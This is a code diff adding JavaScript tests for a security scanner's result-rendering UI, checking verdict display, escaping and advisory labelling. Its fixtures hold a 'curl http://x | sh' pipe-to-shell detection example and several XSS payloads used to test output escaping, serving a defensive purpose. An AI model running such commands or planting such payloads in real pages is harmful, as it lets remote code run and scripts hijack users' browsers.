@@ -8,6 +8,7 @@ import { resultListHtml, normalizeSearchResults, resultCardHtml } from "../src/u
 import { policyResultHtml, policyErrorHtml } from "../src/ui/policy-result.mjs";
 import { evidencePassportHtml } from "../src/ui/evidence-passport.mjs";
 import { policyFromFormValues } from "../src/ui/policy-form.mjs";
+import { scanResultHtml, scanErrorHtml, advisoryFindingsHtml, deterministicFindingsHtml } from "../src/ui/scan-view.mjs";
 
 /**
  * M9 (Issue #31): component-level tests for the isomorphic `apps/web/src/ui/*.mjs` render modules
@@ -187,6 +188,91 @@ test("evidencePassportHtml never shows MATCH unless the resource's own trust.cor
   assert.match(html, /NOT EVALUATED/);
   assert.doesNotMatch(html, />MATCH</);
   assert.match(html, /No source claim yet/);
+});
+
+const SCAN_RESPONSE_FLAGGED = {
+  schemaVersion: "1",
+  contentSha256: "b".repeat(64),
+  verdict: "FLAGGED",
+  cached: false,
+  deterministicFindings: [
+    { ruleId: "shell.curl-pipe-sh", title: "Pipes remote content into a shell", severity: "HIGH", path: "SKILL.md", line: 12, evidence: "curl http://x | sh" },
+  ],
+  advisoryFindings: null,
+  scanCount: 1,
+};
+
+test("scanResultHtml renders the backend verdict verbatim and never fabricates one before a scan", () => {
+  assert.doesNotMatch(scanResultHtml(null), /data-verdict/);
+  const html = scanResultHtml(SCAN_RESPONSE_FLAGGED);
+  assert.match(html, /data-verdict="FLAGGED"/);
+  assert.match(html, /FLAGGED/);
+  assert.doesNotMatch(html, />SAFE</);
+  assert.doesNotMatch(html, />TRUSTED</);
+});
+
+test("scanResultHtml always shows a pasted skill's structural NONE source assurance and NOT_EVALUATED correspondence", () => {
+  // A CLEAN screening must never be able to read as AegisOne source/byte evidence.
+  const html = scanResultHtml({ ...SCAN_RESPONSE_FLAGGED, verdict: "CLEAN", deterministicFindings: [] });
+  assert.match(html, /NO SOURCE CLAIM/);
+  assert.match(html, /NOT EVALUATED/);
+  assert.match(html, /not a safety guarantee/);
+  assert.doesNotMatch(html, /REPOSITORY AUTHENTICATED/);
+  assert.doesNotMatch(html, />MATCH</);
+});
+
+test("scanResultHtml escapes hostile pasted content echoed back in findings", () => {
+  const html = scanResultHtml({
+    ...SCAN_RESPONSE_FLAGGED,
+    deterministicFindings: [
+      {
+        ruleId: "<script>alert('rule')</script>",
+        title: `<img src=x onerror=alert(1)>`,
+        severity: "CRITICAL",
+        path: `"><script>alert('path')</script>`,
+        line: 1,
+        evidence: `<script>alert('evidence')</script>`,
+      },
+    ],
+  });
+  assert.doesNotMatch(html, /<script>alert/);
+  assert.doesNotMatch(html, /<img src=x onerror=alert\(1\)>/);
+});
+
+test("advisory findings are rendered separately from the verdict and always labelled non-authoritative", () => {
+  const html = advisoryFindingsHtml({
+    status: "completed",
+    finding: { summary: "The skill asks for broad filesystem access.", concernLevel: "medium", modelProvider: "0g-compute", ranAt: "2026-08-01T00:00:00.000Z" },
+  });
+  assert.match(html, /advisory only/i);
+  assert.match(html, /not authoritative/i);
+  assert.match(html, /The skill asks for broad filesystem access\./);
+  // The advisory block must not itself present a CLEAN/FLAGGED/BLACKLISTED verdict.
+  assert.doesNotMatch(html, /data-verdict/);
+  assert.doesNotMatch(html, /\bBLACKLISTED\b/);
+});
+
+test("an unavailable/rate-limited advisory pass is stated explicitly and never silently omitted", () => {
+  for (const status of ["advisory_unavailable", "rate_limited", "error"]) {
+    const html = advisoryFindingsHtml({ status, reason: "because" });
+    assert.match(html, /advisory only/i);
+    assert.match(html, /never changes the deterministic verdict/i);
+  }
+  // Not requested at all -> nothing rendered, rather than a fabricated "no concerns" result.
+  assert.equal(advisoryFindingsHtml(null), "");
+});
+
+test("an empty deterministic finding list says so without claiming safety", () => {
+  const html = deterministicFindingsHtml([]);
+  assert.match(html, /No findings is not proof of safety/);
+  assert.doesNotMatch(html, />SAFE</);
+});
+
+test("scanErrorHtml never renders a verdict for a failed scan", () => {
+  const html = scanErrorHtml({ error: "request_too_large", message: "content exceeds the 262144-byte limit" });
+  assert.doesNotMatch(html, /data-verdict/);
+  assert.match(html, /content exceeds the 262144-byte limit/);
+  assert.match(html, /A failed scan is not a verdict/);
 });
 
 test("no rendering module (.mjs) or SSR page (.ts) contains the string \"verified\":true or a bare safe:true literal", async () => {
